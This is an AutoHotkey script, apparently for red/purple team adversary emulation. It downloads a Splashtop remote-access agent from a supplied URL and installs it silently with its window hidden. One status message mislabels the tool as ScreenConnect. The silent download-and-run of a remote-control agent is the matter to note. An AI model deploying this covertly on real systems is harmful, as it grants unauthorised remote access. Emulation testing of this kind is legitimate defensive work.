; AHK v2 
; See Readme.md
; AHK Script to test running of Splashtop EXE via AHK.
; Paste in install link where is says (Paste Install URL here).
; Save with .ahk file extension.
; This should be used only for ethical and legal testing, in the context of adversary emulation or red/purple team testing.  

installerName := "Splashtop_agent(My_Organization).exe"
downloadUrl   := "(Paste Install URL here)"
downloadPath  := A_ScriptDir "\" installerName

ConsoleOutput("Downloading ScreenConnect agent installer...")
if !DownloadFile(downloadUrl, downloadPath)
{
    MsgBox("Download failed. File not found at: " downloadPath, "Error", 16)
    ExitApp(1)
}

Sleep(3000)

ConsoleOutput("Installing Splashtop agent silently...")
exitCode := RunWait(

    downloadPath " prevercheck /s /i hidewindow=1"
  , A_ScriptDir
  , "Hide"


)

if (exitCode = 0)
{
    MsgBox("Splashtop agent installed successfully.", "Success", 64)
}
else if (exitCode = 3010)
{
    MsgBox("Agent installed successfully. A reboot is required to complete installation.", "Installed (Reboot Required)", 48)
}
else
{
    MsgBox("Installation failed with exit code: " exitCode, "Install Failed", 16)
}

ExitApp(0)


ConsoleOutput(str) {
 
    OutputDebug str
 
}

DownloadFile(url, saveAs) {
    req := ComObject("MSXML2.XMLHTTP")
    req.Open("GET", url, false)  ; synchronous
    req.Send()

    ; Check HTTP status
    if (req.status != 200) {
        MsgBox("HTTP error " req.status ": " req.statusText, "Download Failed", 16)
        return false
    }

    ; Use an ADO Stream to write binary response to file
    stream := ComObject("ADODB.Stream")
    stream.Type := 1  ; adTypeBinary
    stream.Open()
    stream.Write(req.ResponseBody)
    stream.SaveToFile(saveAs, 2) ; adSaveCreateOverWrite = 2
    stream.Close()

    return FileExist(saveAs)
}
